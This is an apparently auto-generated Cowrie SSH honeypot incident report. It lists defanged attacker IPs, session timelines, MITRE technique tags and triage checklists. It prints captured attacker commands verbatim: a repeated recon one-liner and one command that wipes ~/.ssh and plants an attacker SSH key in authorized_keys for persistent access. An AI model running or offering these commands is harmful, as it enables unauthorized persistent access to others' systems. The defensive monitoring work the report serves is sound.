| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:49:20` | `cowrie.session.connect` |
| `2026-09-08 04:49:21` | `cowrie.client.version` |
| `2026-09-08 04:49:21` | `cowrie.client.kex` |
| `2026-09-08 04:49:22` | `cowrie.login.success` |
| `2026-09-08 04:49:23` | `cowrie.session.params` |
| `2026-09-08 04:49:23` | `cowrie.command.input` |
| `2026-09-08 04:49:24` | `cowrie.log.closed` |
| `2026-09-08 04:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9dd5ad0a642

| Field | Detail |
|---|---|
| **Source IP** | `34.34.185[.]242` |
| **First Seen** | 2026-09-08 04:50 |
| **Last Seen** | 2026-09-08 04:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:50:38` | `cowrie.session.connect` |
| `2026-09-08 04:50:38` | `cowrie.login.success` |
| `2026-09-08 04:50:38` | `cowrie.session.params` |
| `2026-09-08 04:50:38` | `cowrie.command.input` |
| `2026-09-08 04:50:38` | `cowrie.command.input` |
| `2026-09-08 04:50:38` | `cowrie.command.failed` |
| `2026-09-08 04:50:38` | `cowrie.command.input` |
| `2026-09-08 04:50:38` | `cowrie.log.closed` |
| `2026-09-08 04:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.185[.]242` to AbuseIPDB if not already reported
- [ ] Block `34.34.185[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b28c2ee213

| Field | Detail |
|---|---|
| **Source IP** | `34.34.185[.]242` |
| **First Seen** | 2026-09-08 04:50 |
| **Last Seen** | 2026-09-08 04:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:50:51` | `cowrie.session.connect` |
| `2026-09-08 04:50:51` | `cowrie.login.success` |
| `2026-09-08 04:50:52` | `cowrie.session.params` |
| `2026-09-08 04:50:52` | `cowrie.command.input` |
| `2026-09-08 04:50:52` | `cowrie.command.failed` |
| `2026-09-08 04:50:59` | `cowrie.log.closed` |
| `2026-09-08 04:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.185[.]242` to AbuseIPDB if not already reported
- [ ] Block `34.34.185[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c962ae76a848

| Field | Detail |
|---|---|
| **Source IP** | `34.34.185[.]242` |
| **First Seen** | 2026-09-08 04:50 |
| **Last Seen** | 2026-09-08 04:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:50:53` | `cowrie.session.connect` |
| `2026-09-08 04:50:53` | `cowrie.login.success` |
| `2026-09-08 04:50:53` | `cowrie.session.params` |
| `2026-09-08 04:50:53` | `cowrie.command.input` |
| `2026-09-08 04:50:59` | `cowrie.log.closed` |
| `2026-09-08 04:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.34.185[.]242` to AbuseIPDB if not already reported
- [ ] Block `34.34.185[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17f8450556c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:51 |
| **Last Seen** | 2026-09-08 04:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:51:37` | `cowrie.session.connect` |
| `2026-09-08 04:51:38` | `cowrie.client.version` |
| `2026-09-08 04:51:38` | `cowrie.client.kex` |
| `2026-09-08 04:51:39` | `cowrie.login.success` |
| `2026-09-08 04:51:40` | `cowrie.session.params` |
| `2026-09-08 04:51:40` | `cowrie.command.input` |
| `2026-09-08 04:51:40` | `cowrie.log.closed` |
| `2026-09-08 04:51:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688c6ed18bc8

| Field | Detail |
|---|---|
| **Source IP** | `186.180.130[.]170` |
| **First Seen** | 2026-09-08 04:52 |
| **Last Seen** | 2026-09-08 04:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:52:29` | `cowrie.session.connect` |
| `2026-09-08 04:52:29` | `cowrie.client.version` |
| `2026-09-08 04:52:29` | `cowrie.client.kex` |
| `2026-09-08 04:52:29` | `cowrie.login.success` |
| `2026-09-08 04:52:30` | `cowrie.session.params` |
| `2026-09-08 04:52:30` | `cowrie.command.input` |
| `2026-09-08 04:52:30` | `cowrie.command.failed` |
| `2026-09-08 04:52:30` | `cowrie.log.closed` |
| `2026-09-08 04:52:31` | `cowrie.session.params` |
| `2026-09-08 04:52:31` | `cowrie.command.input` |
| `2026-09-08 04:52:31` | `cowrie.session.file_download` |
| `2026-09-08 04:52:31` | `cowrie.log.closed` |
| `2026-09-08 04:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.180.130[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.180.130[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6760ce1f07e

| Field | Detail |
|---|---|
| **Source IP** | `186.180.130[.]170` |
| **First Seen** | 2026-09-08 04:52 |
| **Last Seen** | 2026-09-08 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:52:32` | `cowrie.session.connect` |
| `2026-09-08 04:52:32` | `cowrie.client.version` |
| `2026-09-08 04:52:32` | `cowrie.client.kex` |
| `2026-09-08 04:52:32` | `cowrie.login.success` |
| `2026-09-08 04:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.180.130[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.180.130[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95488b4d5fbe

| Field | Detail |
|---|---|
| **Source IP** | `186.180.130[.]170` |
| **First Seen** | 2026-09-08 04:52 |
| **Last Seen** | 2026-09-08 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:52:32` | `cowrie.session.connect` |
| `2026-09-08 04:52:32` | `cowrie.client.version` |
| `2026-09-08 04:52:33` | `cowrie.client.kex` |
| `2026-09-08 04:52:33` | `cowrie.login.success` |
| `2026-09-08 04:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.180.130[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.180.130[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4e841343ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:53 |
| **Last Seen** | 2026-09-08 04:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:53:49` | `cowrie.session.connect` |
| `2026-09-08 04:53:49` | `cowrie.client.version` |
| `2026-09-08 04:53:49` | `cowrie.client.kex` |
| `2026-09-08 04:53:50` | `cowrie.login.success` |
| `2026-09-08 04:53:51` | `cowrie.session.params` |
| `2026-09-08 04:53:51` | `cowrie.command.input` |
| `2026-09-08 04:53:51` | `cowrie.log.closed` |
| `2026-09-08 04:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c38dd215e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:56 |
| **Last Seen** | 2026-09-08 04:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:56:05` | `cowrie.session.connect` |
| `2026-09-08 04:56:06` | `cowrie.client.version` |
| `2026-09-08 04:56:06` | `cowrie.client.kex` |
| `2026-09-08 04:56:07` | `cowrie.login.success` |
| `2026-09-08 04:56:08` | `cowrie.session.params` |
| `2026-09-08 04:56:08` | `cowrie.command.input` |
| `2026-09-08 04:56:08` | `cowrie.log.closed` |
| `2026-09-08 04:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a984da3f8023

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:58 |
| **Last Seen** | 2026-09-08 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:58:16` | `cowrie.session.connect` |
| `2026-09-08 04:58:16` | `cowrie.client.version` |
| `2026-09-08 04:58:16` | `cowrie.client.kex` |
| `2026-09-08 04:58:17` | `cowrie.login.success` |
| `2026-09-08 04:58:19` | `cowrie.session.params` |
| `2026-09-08 04:58:19` | `cowrie.command.input` |
| `2026-09-08 04:58:19` | `cowrie.log.closed` |
| `2026-09-08 04:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b886c36e935

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:00 |
| **Last Seen** | 2026-09-08 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:00:18` | `cowrie.session.connect` |
| `2026-09-08 05:00:18` | `cowrie.client.version` |
| `2026-09-08 05:00:18` | `cowrie.client.kex` |
| `2026-09-08 05:00:21` | `cowrie.login.success` |
| `2026-09-08 05:00:22` | `cowrie.session.params` |
| `2026-09-08 05:00:22` | `cowrie.command.input` |
| `2026-09-08 05:00:22` | `cowrie.log.closed` |
| `2026-09-08 05:00:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d1c8ae5335

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:02 |
| **Last Seen** | 2026-09-08 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:02:39` | `cowrie.session.connect` |
| `2026-09-08 05:02:39` | `cowrie.client.version` |
| `2026-09-08 05:02:39` | `cowrie.client.kex` |
| `2026-09-08 05:02:40` | `cowrie.login.success` |
| `2026-09-08 05:02:41` | `cowrie.session.params` |
| `2026-09-08 05:02:41` | `cowrie.command.input` |
| `2026-09-08 05:02:41` | `cowrie.log.closed` |
| `2026-09-08 05:02:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66d52d8203b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:05 |
| **Last Seen** | 2026-09-08 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:05:56` | `cowrie.session.connect` |
| `2026-09-08 05:05:56` | `cowrie.client.version` |
| `2026-09-08 05:05:56` | `cowrie.client.kex` |
| `2026-09-08 05:05:58` | `cowrie.login.success` |
| `2026-09-08 05:05:59` | `cowrie.session.params` |
| `2026-09-08 05:05:59` | `cowrie.command.input` |
| `2026-09-08 05:05:59` | `cowrie.log.closed` |
| `2026-09-08 05:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5610fd9c20ca

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:08 |
| **Last Seen** | 2026-09-08 05:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:08:08` | `cowrie.session.connect` |
| `2026-09-08 05:08:08` | `cowrie.client.version` |
| `2026-09-08 05:08:08` | `cowrie.client.kex` |
| `2026-09-08 05:08:09` | `cowrie.login.success` |
| `2026-09-08 05:08:11` | `cowrie.session.params` |
| `2026-09-08 05:08:11` | `cowrie.command.input` |
| `2026-09-08 05:08:11` | `cowrie.log.closed` |
| `2026-09-08 05:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b8676f013a3

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-08 05:09 |
| **Last Seen** | 2026-09-08 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:09:15` | `cowrie.session.connect` |
| `2026-09-08 05:09:15` | `cowrie.client.version` |
| `2026-09-08 05:09:15` | `cowrie.client.kex` |
| `2026-09-08 05:09:16` | `cowrie.login.success` |
| `2026-09-08 05:09:17` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:09:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:09:17` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.request` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.ja4` |
| `2026-09-08 05:09:18` | `cowrie.direct-tcpip.data` |
| `2026-09-08 05:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30b2362e5aad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:10 |
| **Last Seen** | 2026-09-08 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:10:38` | `cowrie.session.connect` |
| `2026-09-08 05:10:38` | `cowrie.client.version` |
| `2026-09-08 05:10:38` | `cowrie.client.kex` |
| `2026-09-08 05:10:39` | `cowrie.login.success` |
| `2026-09-08 05:10:40` | `cowrie.session.params` |
| `2026-09-08 05:10:40` | `cowrie.command.input` |
| `2026-09-08 05:10:40` | `cowrie.log.closed` |
| `2026-09-08 05:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4122b09628

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:13 |
| **Last Seen** | 2026-09-08 05:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:13:56` | `cowrie.session.connect` |
| `2026-09-08 05:13:56` | `cowrie.client.version` |
| `2026-09-08 05:13:56` | `cowrie.client.kex` |
| `2026-09-08 05:13:58` | `cowrie.login.success` |
| `2026-09-08 05:13:59` | `cowrie.session.params` |
| `2026-09-08 05:13:59` | `cowrie.command.input` |
| `2026-09-08 05:13:59` | `cowrie.log.closed` |
| `2026-09-08 05:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4b7ca8f60c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 05:16 |
| **Last Seen** | 2026-09-08 05:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 05:16:10` | `cowrie.session.connect` |
